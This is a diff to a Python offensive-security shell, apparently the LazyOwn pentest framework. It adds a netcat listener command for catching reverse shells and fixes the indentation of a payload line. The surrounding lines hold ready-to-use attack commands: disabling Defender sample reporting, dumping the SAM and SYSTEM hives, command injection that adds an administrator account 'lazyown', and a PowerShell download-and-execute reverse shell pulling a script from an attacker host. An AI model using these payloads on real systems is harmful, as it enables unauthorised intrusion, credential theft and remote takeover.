@@ -84,6 +84,7 @@ class LazyOwnShell(Cmd):
         "ftpsniff": "run lazyftpsniff",
         "gpt": "run lazygptcli",
         "hash": "sh cat sessions/hash*",
+        "hosts": "sh sudo nano /etc/hosts",
         "ls": "list",
         "nmap": "run lazynmap",
         "now": "clock",
@@ -5122,7 +5123,7 @@ class LazyOwnShell(Cmd):
             ("WIN Disable defender", "Set-MpPreference -SubmitSamplesConsent 2 -MAPSReporting 0"),
             ("WIN sam", "cd / ; mkdir Temp ; reg save hklm\sam c:\Temp\sam ; reg save hklm\system c:\Temp\system ; cd Temp ; download sam ; download system"),
             ("PYPYKATZ", "pypykatz registry --sam sam system"),
-("WIN WEB Inyection", "abc.txt | powershell -enc "),
+            ("WIN WEB Inyection", "abc.txt | powershell -enc "),
             ("WIN WEB Inyection" ,'abc.txt | net user lazyown abc123! /add ; net localgroup administrators lazyown /add'),
             ("WIN ReverShell winbase64encode", f'echo -n "IEX(new-objectnet.webclient).downloadstring(\'http://{lhost}/Invoke-PowerShellTcp.ps1\')" | iconv -t UTF-16LE | base64 -w0'),
             ("WIN ReverShell echo", f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}' >> sessions/Invoke-PowerShellTcp.ps1"),            
@@ -12911,6 +12912,48 @@ class LazyOwnShell(Cmd):
 
         return
 
+    def do_nc(self, line):
+        """
+        Runs `nc` with the specified port for listening.
+
+        This function starts a `nc` listener on the specified local port. It can use a port defined in the `lport` parameter or a port provided as an argument.
+
+        Usage:
+            pwncatcs <port>
+
+        :param line: The port number to use for the `nc` listener. If not provided, it defaults to the `lport` parameter.
+        :type line: str
+        :returns: None
+
+        Manual execution:
+        1. Ensure that `nc` is installed and accessible from your command line.
+        2. The port number can either be provided as an argument or be set in the `lport` parameter of the function.
+        3. Run the function to start `nc` on the specified port.
+
+        If no port is provided as an argument, the function will use the port specified in the `lport` parameter. If a port is provided, it overrides the `lport` value.
+
+        After starting the listener, the function prints a message indicating that `nc` is running on the specified port and another message when the session is closed.
+
+        Dependencies:
+        - `nc`: A tool used for creating reverse shells or bind shells.
+        """
+
+        lport = self.params["lport"]
+        if not lport and not line:
+            print_error(
+                f"lport must be set or pass the port by parameter like: nc 6666.{RESET}"
+            )
+            return
+        if not line:
+            print_msg(f"Try.. sudo nc -lvnp {lport}{RESET}")
+            os.system(f"sudo nc -lvnp {lport}")
+        else:
+            print_msg(f"Try.. sudo nc -lvnp {line}{RESET}")
+            os.system(f"sudo nc -lvnp {line}")
+        print_msg(
+            f"{RED}[*] {YELLOW} Shutdown nc sessions in port {RED} [{lport}|{line}] {RESET}"
+        )
+        return
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.onecmd("p")
